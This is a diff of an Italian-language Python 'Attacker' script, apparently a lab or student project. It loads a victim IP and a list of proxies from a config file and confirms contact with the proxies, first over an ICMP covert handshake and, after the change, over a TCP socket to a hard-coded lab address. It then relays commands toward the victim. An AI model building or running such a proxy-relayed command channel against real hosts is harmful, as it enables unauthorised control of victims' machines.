@@ -13,6 +13,7 @@ import threading
 from functools import partial 
 import json
 import type_singleton as singleton
+import socket
 
 file_path = "../comunication_methods.py"
 directory = os.path.dirname(file_path)
@@ -25,24 +26,7 @@ sys.path.insert(0, directory)
 import mymethods 
 
 
-#-----------------------------------------
-
-
-
-#-----------------------------------------
-def callback_wait_conn_from_proxy(ip_vittima:ipaddress.IPv4Address|ipaddress.IPv6Address=None,event_pktconn:threading.Event=None): 
-    def callback(packet):
-        print(f"callback wait_conn_from_proxy received:\n\t{packet.summary()}") 
-        if packet.haslayer(IP) and packet.haslayer(ICMP) and packet.haslayer(Raw): 
-            confirm_text=com.CONFIRM_PROXY+ip_vittima.compressed+ipaddress.ip_address(packet[IP].src).compressed
-            checksum=mymethods.calc_checksum((confirm_text).encode())
-            if checksum==packet[ICMP].id and confirm_text.encode() in packet[Raw].load: 
-                print(f"Il pacchetto di {packet[IP].src} ha confermato la connessione") 
-                com.set_threading_Event(event_pktconn) 
-                return
-            print(f"Il pacchetto di {packet[IP].src} non ha confermato la connessione") 
-    return callback 
-
+#----------------------------------------- 
 def callback_wait_proxy_update(ip_vittima:ipaddress.IPv4Address|ipaddress.IPv6Address, thread_lock:threading.Lock, thread_proxy_response:dict, event_proxy_update:threading.Event): 
     def callback(packet):
         print(f"callback attacker_wait_proxy_update received:\n\t{packet.summary()}")
@@ -126,9 +110,9 @@ def sanifica_lista_proxy(proxy_list:list=None):
     print(f"Lista proxy sanificata: {new_proxy_list}")
     return new_proxy_list
 
-def set_proxy_list(attack_file):
+def set_proxy_list(config_file):
     proxy_list:list[ipaddress.IPv4Address|ipaddress.IPv6Address]=[]
-    for dict_proxy in attack_file.get("proxy_list", []):
+    for dict_proxy in config_file.get("proxy_list", []):
         if not isinstance(dict_proxy, dict):
             print(f"proxy is not dict: {dict_proxy}")
             continue 
@@ -151,8 +135,8 @@ def setIP_host():
             raise ValueError(f"L'indirizzo IP del host non è valido: {ip_host}:{errore}") 
         return ip_host
 
-def setIP_vittima(attack_file):
-        ip_vittima = ipaddress.ip_address(attack_file.get("ip_vittima", None))  
+def setIP_vittima(config_file):
+        ip_vittima = ipaddress.ip_address(config_file.get("ip_vittima", None))  
         if ip_vittima is None or not (isinstance(ip_vittima, ipaddress.IPv4Address) or isinstance(ip_vittima, ipaddress.IPv6Address)):
             raise ValueError(f"L'indirizzo IP della vittima non è valido: {ip_vittima}") 
         return ip_vittima
@@ -179,90 +163,71 @@ def load_config_file(default_file_path, path_of_file):
             print(f"File di configurazione {path_of_file} caricato correttamente") 
             return json.load(file)
 
-#-----------------------------------------
-def get_value_of_parser(args):
-    if args is None: 
-        raise Exception("get_value_of_parser: Nessun argomento passato") 
-    return args.file_path
-
+#----------------------------------------- 
 def check_value_in_parser(args):
-    if type(args) is not argparse.Namespace or args is None:
-        print("Nessun argomento passato") 
-        return False
-    try:
-        com.is_string(args.file_path)
-    except Exception as e:
-        print("Devi specificare il file di configurazione con --file_path")
-        mymethods.print_parser_supported_arguments(parser)
-        return False 
+    if not isinstance(args,argparse.Namespace): 
+        raise Exception(f"Argomento parser non è istanza di argparse.Namespace")  
+    if not isinstance(args.file_path,str):
+        raise Exception(f"--file_path non specificato: {args.file_path}") 
     return True
 
-def get_args_from_parser():
-    global parser
+def get_args_from_parser(): 
     parser = argparse.ArgumentParser()
-    parser.add_argument("--file_path",type=str, help="File di configurazione") 
-    args= mymethods.check_args(parser)
-    if not check_value_in_parser(args): 
-        raise ValueError("Argomenti nel parser non corretti") 
-    return get_value_of_parser(args) 
+    parser.add_argument("--file_path",type=str, help="File di configurazione")  
+    try:
+        args, unknown =mymethods.check_for_unknown_args(parser)  
+        if len(unknown) > 0: 
+            raise Exception(f"Argomenti sconosciuti: {unknown}") 
+        if check_value_in_parser(args):  
+            return args
+    except Exception as e:
+        mymethods.print_parser_supported_arguments(parser)
+        raise Exception(f"get_args_from_parser: {e}") 
 
 #-----------------------------------------
 class Attacker:
-    default_file_path:str = "./attack_file.json"  
-
-    def __init__(self):
+    default_file_path:str = "./attack_file.json"    
+    
+    def __init__(self): 
         try:
-            path_of_file=get_args_from_parser() 
-            attack_file=load_config_file(self.default_file_path, path_of_file)
+            args=get_args_from_parser() 
+            dict_values={
+                "file_path":args.file_path  
+            }
+            config_file=load_config_file(self.default_file_path, dict_values.get("file_path"))
         except Exception as e: 
             print(f"__init__ load file: {e}", file=sys.stderr)
             exit(1) 
         try:
-            self.attack_function=attack_type(attack_file)
+            self.attack_function=attack_type(config_file)
             print(f"Attacco selezionato: {self.attack_function}") 
-            self.ip_vittima=setIP_vittima(attack_file)
+            self.ip_vittima=setIP_vittima(config_file)
             print(f"IP vittima valido: {type(self.ip_vittima) } {self.ip_vittima }")
             self.ip_host=setIP_host()  
             print(f"IP host valido: {type(self.ip_host)} {self.ip_host}")
-            self.proxy_list=set_proxy_list(attack_file)
-            self.event_proxy_update=create_event_update_foreach_proxy(self.proxy_list) 
+            self.proxy_list=set_proxy_list(config_file) 
         except Exception as e:
             print(f"__init__ main variable: {e}", file=sys.stderr)
             exit(1)  
         try:
-            #self.check_available_proxies() 
-            result=com.setup_thread_foreach_proxy(self.proxy_list,self.wait_proxy_update)
-            self.thread_lock,self.thread_proxy_response,self.thread_list=result 
-        except Exception as e:
-            print(f"__init__ setup thread: {e}") 
-            exit(1)
-        try:
-            for proxy in self.proxy_list:  
+            self.list_proxy_socket:list[socket.socket]=[]
+            for proxy in self.proxy_list:
+                print("Socket proxy: ",proxy)
+                #basic_socket
+                #with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                 try:
-                    thread=self.thread_list.get(proxy.compressed)
-                    if not isinstance(thread, threading.Thread):
-                        #print(f"Thread non valido {thread}")
-                        continue 
-                    elif thread.ident is None: 
-                        print(f"Thread for {proxy} started")
-                        thread.start() 
-                        #print(f"Thread ID: {thread.ident}")
+                    s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                    s.connect(("192.168.56.104", 4567))
+                    s.sendall(com.CONFIRM_ATTACKER.encode())
+                    data=s.recv(1024)
+                    print(f"\tReceived: {data}")
+                    if not data:
+                        print("Close connection")  
                 except Exception as e:
-                    print(f"check_available_proxies: {e}")
-                    continue 
-                if self.confirm_connection_to_proxy(proxy) and self.wait_conn_from_proxy(proxy):
-                    print(f"Connessione stabilita con {proxy}") 
-                    com.update_thread_response(proxy, self.thread_lock, self.thread_proxy_response, True)
-                else: 
-                    print(f"Connessione fallita con {proxy}") 
-            for proxy,thread in self.thread_list.items():
-                if thread.ident is not None and thread.is_alive():  
-                    com.set_threading_Event(self.event_proxy_update.get(proxy))
-                    thread.join() 
-            elimina_proxy_nonconnessi(self.thread_lock, self.thread_proxy_response, self.proxy_list) 
-            print(f"Proxy disponibili dopo eliminazione\t{self.proxy_list}")
+                    print(f"Eccezione: {e}") 
+
         except Exception as e:
-            print(f"__init__ start thread: {e}") 
+            print(f"__init__ connected proxy: {e}") 
             exit(0)
     
     def wait_proxy_update(self,proxy:ipaddress.IPv4Address|ipaddress.IPv6Address): 
@@ -328,83 +293,9 @@ class Attacker:
             print(f"Il proxy {proxy} non è connesso alla vittima {self.ip_vittima}",file=sys.stderr)  
         return thread_response  
     
-    def confirm_connection_to_proxy(self,proxy): 
-        #print("\n\t(＾▽＾)\tconfirm_connection_to_proxy\n")  
-        try: 
-            if not isinstance(self.ip_vittima, ipaddress.IPv4Address) and not isinstance(self.ip_vittima, ipaddress.IPv6Address):
-                raise Exception(f"Indirizzo IP vittima non è ne un IPv4Address ne un IPv6Address: {self.ip_vittima}")
-            if not isinstance(proxy, ipaddress.IPv4Address) and not isinstance(proxy, ipaddress.IPv6Address):
-                raise Exception(f"Indirizzo IP proxy non è ne un IPv4Address ne un IPv6Address: {proxy}")
-            if not isinstance(self.ip_host, ipaddress.IPv4Address) and not isinstance(self.ip_host, ipaddress.IPv6Address):
-                raise Exception(f"Indirizzo IP host non è ne un IPv4Address ne un IPv6Address: {self.ip_host}")
-        except Exception as e:
-            print(f"confirm_connection_to_proxy: {e}")
-            return False 
-        
-        try:
-            interface_4_proxy,_= mymethods.iface_src_from_IP(proxy) 
-            if interface_4_proxy is None:
-                raise ValueError(f"Interfaccia non valida {interface_4_proxy}")
-            elif interface_4_proxy=="lo": 
-                #print(f"Interfaccia per confermarsi a {proxy} -> loopback")
-                return True
-            #print(f"Interfaccia per confermarsi a {proxy} -> {interface_4_proxy}")
-        except Exception as e:
-            print(f"confirm_connection_to_proxy: {e}")
-            return False
-        
-        data=com.CONFIRM_ATTACKER+self.ip_vittima.compressed
-        if com.send_packet(data.encode() ,proxy.compressed):  
-            #print(f"Il proxy {proxy} ha risposto. Conferma connessione affermativa")
-            return True 
-        #print(f"Il proxy {proxy} non ha risposto. Conferma connessione negativa")
-        return False
     
-    def wait_conn_from_proxy(self,proxy:ipaddress.IPv4Address|ipaddress.IPv6Address=None): 
-        #print("\n\t(＾▽＾)\twait_conn_from_proxy\n")
-        try:
-            if not isinstance(proxy, ipaddress.IPv4Address) and not isinstance(proxy, ipaddress.IPv6Address):
-                raise Exception(f"Indirizzo IP proxy non è ne un IPv4Address ne un IPv6Address: {proxy}")
-        except Exception as e:
-            print(f"wait_conn_from_proxy: {e}")
-            return False
-        confirm_text=com.CONFIRM_PROXY+self.ip_vittima.compressed+proxy.compressed
-        checksum=mymethods.calc_checksum(confirm_text.encode())
-        try:
-            interface_4_proxy,_= mymethods.iface_src_from_IP(proxy)  
-            if interface_4_proxy is None:
-                raise ValueError(f"Interfaccia non valida {interface_4_proxy}")
-            elif interface_4_proxy=="lo": 
-                #print(f"Interfaccia per la conferma di {proxy} -> loopback")
-                return True
-            #print(f"Interfaccia per la conferma di {proxy} -> {interface_4_proxy}")
-        except Exception as e:
-            raise Exception(f"wait_conn_from_proxy: {e}") 
-        filter=singleton.AttackType().get_filter_connection_from_function(
-            "wait_conn_from_proxy", proxy, checksum
-        )
-        #print(f"wait_conn_from_proxy: {singleton.AttackType().get_filter_from_function(next(iter(self.attack_function)))}")
-        self.event_pktconn=com.get_threading_Event()
-        args={
-            "filter":filter
-            #,"count":1 
-            ,"prn":callback_wait_conn_from_proxy(self.ip_vittima, self.event_pktconn)
-            #,"store":True 
-            ,"iface":interface_4_proxy
-        }
-        try:
-            
-            self.sniffer,self.pkt_timer,=com.sniff_packet(args,event=self.event_pktconn) 
-            com.wait_threading_Event(self.event_pktconn) 
-        except Exception as e:
-            raise Exception(f"wait_conn_from_proxy: {e}")  
-        if self.sniffer and hasattr(self.sniffer, 'running') and self.sniffer.running: 
-            com.stop_sinffer(self.sniffer)
-        if com.stop_timer(self.pkt_timer): 
-            #print(f"\twait_conn_from_proxy: Connessione confermata da {proxy}")
-            return True
-        #print(f"\twait_conn_from_proxy: Connessione non confermata da {proxy}")
-        return False 
+    
+    
     
     #------------------------------
     def send_command_to_victim(self):
@@ -479,7 +370,6 @@ class Attacker:
 
     
 
-if __name__=="__main__":
-    print("Ciao")
-    attacker=Attacker()
+if __name__=="__main__": 
+    Attacker()
     #Fare 2a parte
